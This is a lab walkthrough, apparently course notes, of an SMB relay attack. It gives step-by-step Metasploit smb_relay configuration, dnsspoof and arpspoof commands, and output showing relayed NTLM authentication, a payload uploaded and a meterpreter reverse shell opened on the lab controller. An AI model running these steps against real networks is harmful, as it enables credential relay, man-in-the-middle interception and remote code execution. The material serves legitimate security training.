# SMB Relay Attack

### How SMB Relay Attacks Work
**1. Interception**\
The attacker sets up a man-in-middle position between the client and the server.\
Can be done using ARP spoofing, DNS poisoning or setting up a rogue SMB server.\
**2. Caputuring Authentication**\
\- A client connects to a legitimate sesrver via SMB\
\- It sends authentication data\
\- The attacker caputures this data (might include NTLM hashes)\
**3. Relaying to legitimate Server**\
Instead of decrypting the captured NTLM hash, the attacker relays it to another server that trusts the source\
-> This allowss the attacker to impresonate the user whose hash was captured
**4. Gain access**\
If the relay is successful, the attacker can gain access to the resources on the server.

### Tools
`dnsspoof`\
Spoof DNS replies\
It intercepts DNS requests from other machines and send back fake response.


### Practice
Lab environment
```bash
                         ┌────────────────────────────┐
                         │      Default Gateway       │
                         │        172.16.5.1          │
                         └────────────┬───────────────┘
                                      │
               ┌──────────────────────┴──────────────────────────┐
               │                                                 │
   ┌──────────────────────────┐                    ┌──────────────────────────┐
   │ fileserver.sportsfoo.com │                    │ controller.sportsfoo.com │
   │      172.16.5.30         │                    │       172.16.5.10        │
   └──────────────────────────┘                    └──────────────────────────┘
               │                                                 │
   ┌──────────────────────────┐                    ┌──────────────────────────┐
   │      Client Machine      │                    │    Attacker Machine      │
   │       172.16.5.5         │                    │      172.16.5.101        │
   └──────────────────────────┘                    └──────────────────────────┘
               │                                                 │
       Network: 172.16.5.0/24 ───────────────────────────────────┘

                                |
                                |
                                ▼
                Network: 10.10.10.0/24
             ┌────────────────────────────┐     ┌────────────────────────────┐
             │    ftp.sportsfoo.com       │     │  intranet.sportsfoo.com    │
             │       10.10.10.6           │     │       10.10.10.10          │
             └────────────────────────────┘     └────────────────────────────┘


```

**1. Make attaker machine look like SMB with Metasploit module**\
"exploit/windows/smb/smb_relay"
> Pretend to be a SMB because "controller.sportsfoo.com" is SMB and client access\
> Run Nmap to know which service running SMB (fileserver or controller)
```bash
# Start Metasploit
msf6 > search smb_relay
msf6 > use exploit/windows/smb/smb_relay
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/smb_relay) > 

# Configure SMB Relay exploit
msf6 exploit(windows/smb/smb_relay) > set SRVHOST 172.16.5.101
# SRVHOST(Server Host) typically attaker IP address
SRVHOST => 172.16.5.101
msf6 exploit(windows/smb/smb_relay) > set LHOST 172.16.5.101
LHOST => 172.16.5.101
msf6 exploit(windows/smb/smb_relay) > set SMBHOST 172.16.5.10
# The fical destication for the relayed authentication attempt
# The real SMB (controller.sportsfoo.com)
SMBHOST => 172.16.5.10

# Exploit the module
msf6 exploit(windows/smb/smb_relay) > run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 172.16.5.101:4444 
[*] Started service listener on 172.16.5.101:445 
[*] Server started.
```

**2. Create a file overwrite output of command**\
Want to make client ask attacker to resolve every time it try to access any subdomain\
`echo` : A command that simply prints whatever follows it to the tandard output\
`*.sportsfoo.com` : A wildcard domain. Means "any subdomain under sportsfoo.com (fileserver.sportsfoo.com, controller.sportsfoo.com etc)"\
`>` : Redirect echo command output to the `dns` file
```bash
# New tab
└─# echo "172.16.5.101 *.sportsfoo.com" > dns
```

**3. DNS Spoof**\
Return attacker IP address to all the DNS query for any `*.sportsfoo.com` \
Host file format -> dns file
```bash
└─# dnsspoof -i eth1 -f dns
dnsspoof: listening on eth1 [udp dst port 53 and not src 172.16.5.101]
```

**4. Enable Ip forwarding for ARP spoofing**
Enable IP forwarding!\
`/proc/sys/`: contains virtual files that allow you to view and change kernel parameters at runtime.\
`net/ipv4/ip_forwarding`: specifically controls whether the Linux kernel should act as a router for IPv4 traffic.\
(0 = disable, 1 = enable)
```bash
# new tab
─# echo 1 > /proc/sys/net/ipv4/ip_forward
┌──(rootkali)-[~]
└─# 
```

**5. ARP spoofing**
Send ARP replies to `172.16.5.5` (Client) that MAC address of `172.16.5.1` (Default Gateway) is attacker's MAC address\
-> Client update its ARP cache\
-> Start sending all traffic destined for the gateway to attacker instead\
```bash
└─# arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
8:0:27:d4:ee:5d 8:0:27:8f:79:cc 0806 42: arp reply 172.16.5.1 is-at 8:0:27:d4:ee:5d

# New tab
# Send gateway ARP reply that Client MAC address is attacker's
└─# arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
8:0:27:d4:ee:5d a:0:27:0:0:3 0806 42: arp reply 172.16.5.5 is-at 8:0:27:d4:ee:5d
```

**6. Got result (the last line)**
`172.16.5.5` -> IP address of the machine making the DNS query (Client)\
`64169` -> Source port on the Client\
`8.8.4.4` -> Destination IP address (common public DSN Server)\
`fileserver.sportsfoo.com` -> The hostname that the client is trying to resolve
```bash
└─# dnsspoof -i eth1 -f dns                  
dnsspoof: listening on eth1 [udp dst port 53 and not src 172.16.5.101]
172.16.5.5.64169 > 8.8.4.4.53:  59316+ A? fileserver.sportsfoo.com
```

```bash
msf6 exploit(windows/smb/smb_relay) > [*] Sending NTLMSSP NEGOTIATE to 172.16.5.10
[*] Extracting NTLMSSP CHALLENGE from 172.16.5.10
[*] Forwarding the NTLMSSP CHALLENGE to 172.16.5.5:49159
[*] Extracting the NTLMSSP AUTH resolution from 172.16.5.5:49159, and sending Logon Failure response
[*] Forwarding the NTLMSSP AUTH resolution to 172.16.5.10
[+] SMB auth relay against 172.16.5.10 succeeded
[*] Connecting to the defined share...
[*] Regenerating the payload...
[*] Uploading payload...
[*] Created \MyACuubN.exe...
[*] Connecting to the Service Control Manager...
[*] Obtaining a service manager handle...
[*] Creating a new service...
[*] Closing service handle...
[*] Opening service...
[*] Starting the service...
[*] Removing the service...
[*] Closing service handle...
[*] Deleting \MyACuubN.exe...
[*] Sending stage (175174 bytes) to 172.16.5.10
[*] Meterpreter session 1 opened (172.16.5.101:4444 -> 172.16.5.10:49158) at 2022-01-21 19:31:47 -0500
[*] Sending NTLMSSP NEGOTIATE to 172.16.5.10
[*] Extracting NTLMSSP CHALLENGE from 172.16.5.10
[*] Forwarding the NTLMSSP CHALLENGE to 172.16.5.5:49161
[*] Extracting the NTLMSSP AUTH resolution from 172.16.5.5:49161, and sending Logon Failure response
[*] Forwarding the NTLMSSP AUTH resolution to 172.16.5.10
[+] SMB auth relay against 172.16.5.10 succeeded
[*] Ignoring request from 172.16.5.10, attack already in progress.
[*] Sending NTLMSSP NEGOTIATE to 172.16.5.10
[*] Extracting NTLMSSP CHALLENGE from 172.16.5.10
[*] Forwarding the NTLMSSP CHALLENGE to 172.16.5.5:49163
[*] Extracting the NTLMSSP AUTH resolution from 172.16.5.5:49163, and sending Logon Failure response
[*] Forwarding the NTLMSSP AUTH resolution to 172.16.5.10
[+] SMB auth relay against 172.16.5.10 succeeded
[*] Ignoring request from 172.16.5.10, attack already in progress.
```

